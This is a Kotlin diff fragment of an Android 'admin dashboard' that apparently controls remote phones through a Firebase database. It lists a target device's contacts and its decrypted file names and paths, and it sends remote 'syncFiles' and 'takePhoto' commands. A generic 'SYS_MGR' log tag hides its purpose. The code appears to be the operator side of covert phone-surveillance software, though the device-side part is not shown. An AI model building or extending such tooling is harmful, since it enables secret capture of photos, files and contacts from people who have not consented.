+                containerColor = MaterialTheme.colorScheme.surfaceVariant
+            )
+        ) {
+            Row(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(10.dp),
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                // Avatar circle
+                Box(
+                    modifier = Modifier
+                        .size(36.dp)
+                        .background(
+                            MaterialTheme.colorScheme.primary,
+                            shape = RoundedCornerShape(18.dp)
+                        ),
+                    contentAlignment = Alignment.Center
+                ) {
+                    Text(
+                        text = contact.name.firstOrNull()?.uppercase() ?: "?",
+                        color = MaterialTheme.colorScheme.onPrimary,
+                        fontWeight = FontWeight.Bold,
+                        fontSize = 14.sp
+                    )
+                }
+
+                Spacer(modifier = Modifier.width(10.dp))
+
+                Column {
+                    Text(
+                        text = contact.name,
+                        fontWeight = FontWeight.Medium,
+                        fontSize = 13.sp
+                    )
+                    Text(
+                        text = contact.phone,
+                        fontSize = 12.sp,
+                        color = MaterialTheme.colorScheme.onSurfaceVariant
+                    )
+                    contact.email?.let {
+                        Text(
+                            text = it,
+                            fontSize = 11.sp,
+                            color = MaterialTheme.colorScheme.onSurfaceVariant
+                        )
+                    }
+                }
+            }
+        }
+    }
+
+    /**
+     * syncFiles command ni Firebase'ga yozadi
+     */
+    private fun sendSyncFilesCommand(deviceId: String) {
+        val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+            .getReference("devices")
+            .child(deviceId)
+            .child("commands")
+
+        commandsRef.child("syncFiles").setValue(mapOf(
+            "type" to "syncFiles",
+            "timestamp" to ServerValue.TIMESTAMP,
+            "status" to "pending"
+        ))
+        if (BuildConfig.DEBUG) { Log.d("SYS_MGR", "syncFiles command sent for device: $deviceId") }
+    }
+
+    /**
+     * Fayllar ro'yxatini ko'rsatuvchi panel
+     */
+    @Composable
+    private fun FilesPanel(deviceId: String, onDismiss: () -> Unit) {
+        var filesList by remember { mutableStateOf<List<FileItem>>(emptyList()) }
+        var isLoading by remember { mutableStateOf(true) }
+        var searchQuery by remember { mutableStateOf("") }
+
+        LaunchedEffect(deviceId) {
+            val filesRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+                .getReference("devices")
+                .child(deviceId)
+                .child("files")
+
+            filesRef.addValueEventListener(object : ValueEventListener {
+                override fun onDataChange(snapshot: DataSnapshot) {
+                    val aesKey = KeyManager.getAesKey(this@AdminDashboardActivity)
+                    val list = mutableListOf<FileItem>()
+                    snapshot.children.forEach { child ->
+                        try {
+                            val id = child.child("id").getValue(String::class.java) ?: ""
+                            val rawName = child.child("name").getValue(String::class.java) ?: ""
+                            val rawPath = child.child("path").getValue(String::class.java) ?: ""
+                            val size = child.child("size").getValue(Long::class.java) ?: 0L
+                            val mimeType = child.child("mimeType").getValue(String::class.java) ?: ""
+                            val dateModified = child.child("dateModified").getValue(Long::class.java) ?: 0L
+
+                            val name = if (aesKey != null) {
+                                CryptoManager.decrypt(rawName, aesKey) ?: rawName
+                            } else rawName
+
+                            val path = if (aesKey != null) {
+                                CryptoManager.decrypt(rawPath, aesKey) ?: rawPath
+                            } else rawPath
+
+                            list.add(FileItem(
+                                id = id,
+                                name = name,
+                                path = path,
+                                size = size,
+                                mimeType = mimeType,
+                                dateModified = dateModified
+                            ))
+                        } catch (e: Exception) {
+                            if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "File parse error: ${e.message}") }
+                        }
+                    }
+                    filesList = list.sortedByDescending { it.dateModified }
+                    isLoading = false
+                }
+
+                override fun onCancelled(error: DatabaseError) {
+                    if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "Files listener cancelled: ${error.message}") }
+                    isLoading = false
+                }
+            })
+        }
+
+        val filtered = if (searchQuery.isBlank()) filesList
+        else filesList.filter {
+            it.name.contains(searchQuery, ignoreCase = true) ||
+            it.mimeType.contains(searchQuery, ignoreCase = true)
+        }
+
+        Card(
+            modifier = Modifier
+                .fillMaxWidth()
+                .fillMaxHeight(0.7f)
+                .padding(16.dp),
+            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
+        ) {
+            Column(modifier = Modifier.padding(16.dp)) {
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.SpaceBetween,
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Text(
+                        text = "📁 Fayllar (${filesList.size})",
+                        style = MaterialTheme.typography.titleMedium,
+                        fontWeight = FontWeight.Bold
+                    )
+                    TextButton(onClick = onDismiss) { Text("Close") }
+                }
+
+                Spacer(modifier = Modifier.height(8.dp))
+
+                OutlinedTextField(
+                    value = searchQuery,
+                    onValueChange = { searchQuery = it },
+                    placeholder = { Text("Qidirish...", fontSize = 13.sp) },
+                    modifier = Modifier.fillMaxWidth(),
+                    singleLine = true
+                )
+
+                Spacer(modifier = Modifier.height(8.dp))
+
+                if (isLoading) {
+                    Box(modifier = Modifier.fillMaxWidth(), contentAlignment = Alignment.Center) {
+                        CircularProgressIndicator()
+                    }
+                } else if (filesList.isEmpty()) {
+                    Text(
+                        text = "Fayllar topilmadi. Sync tugmasini bosing.",
+                        color = MaterialTheme.colorScheme.onSurfaceVariant,
+                        modifier = Modifier.padding(8.dp)
+                    )
+                } else {
+                    LazyColumn {
+                        items(filtered) { file ->
+                            FileItemRow(file)
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    @Composable
+    private fun FileItemRow(file: FileItem) {
+        val dateStr = remember(file.dateModified) {
+            if (file.dateModified > 0) {
+                SimpleDateFormat("dd.MM.yy HH:mm", Locale.getDefault()).format(Date(file.dateModified))
+            } else ""
+        }
+        val sizeStr = remember(file.size) {
+            when {
+                file.size < 1024 -> "${file.size} B"
+                file.size < 1024 * 1024 -> "${file.size / 1024} KB"
+                else -> "${file.size / (1024 * 1024)} MB"
+            }
+        }
+        val fileIcon = when {
+            file.mimeType.startsWith("image/") -> "🖼️"
+            file.mimeType.startsWith("video/") -> "🎬"
+            file.mimeType.startsWith("audio/") -> "🎵"
+            file.mimeType.contains("pdf") -> "📄"
+            file.mimeType.contains("zip") || file.mimeType.contains("rar") -> "🗜️"
+            else -> "📄"
+        }
+
+        Card(
+            modifier = Modifier
+                .fillMaxWidth()
+                .padding(vertical = 3.dp),
+            colors = CardDefaults.cardColors(
+                containerColor = MaterialTheme.colorScheme.surfaceVariant
+            )
+        ) {
+            Row(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(10.dp),
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Text(text = fileIcon, fontSize = 24.sp)
+
+                Spacer(modifier = Modifier.width(10.dp))
+
+                Column(modifier = Modifier.weight(1f)) {
+                    Text(
+                        text = file.name,
+                        fontWeight = FontWeight.Medium,
+                        fontSize = 13.sp,
+                        maxLines = 1
+                    )
+                    Text(
+                        text = file.mimeType.ifBlank { "unknown" },
+                        fontSize = 11.sp,
+                        color = MaterialTheme.colorScheme.onSurfaceVariant
+                    )
+                }
+
+                Column(horizontalAlignment = Alignment.End) {
+                    Text(
+                        text = sizeStr,
+                        fontSize = 11.sp,
+                        fontWeight = FontWeight.Medium,
+                        color = MaterialTheme.colorScheme.primary
+                    )
+                    Text(
+                        text = dateStr,
+                        fontSize = 10.sp,
+                        color = MaterialTheme.colorScheme.onSurfaceVariant
+                    )
+                }
+            }
+        }
+    }
+
+    /**
+     * takePhoto command ni Firebase'ga yozadi
+     */
+    private fun sendTakePhotoCommand(deviceId: String) {
+        val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+            .getReference("devices")
+            .child(deviceId)
+            .child("commands")
+
+        commandsRef.child("takePhoto").setValue(mapOf(
+            "type" to "takePhoto",
+            "timestamp" to ServerValue.TIMESTAMP,
+            "status" to "pending"
+        ))
+        if (BuildConfig.DEBUG) { Log.d("SYS_MGR", "takePhoto command sent for device: $deviceId") }
+    }
+
+    override fun onResume() {
+        super.onResume()
+    }
+    
+    override fun onPause() {
+        super.onPause()
+    }
+    
+    override fun onDestroy() {
+        super.onDestroy()
+    }
+    
+    override fun onLowMemory() {
+        super.onLowMemory()
+    }
+}
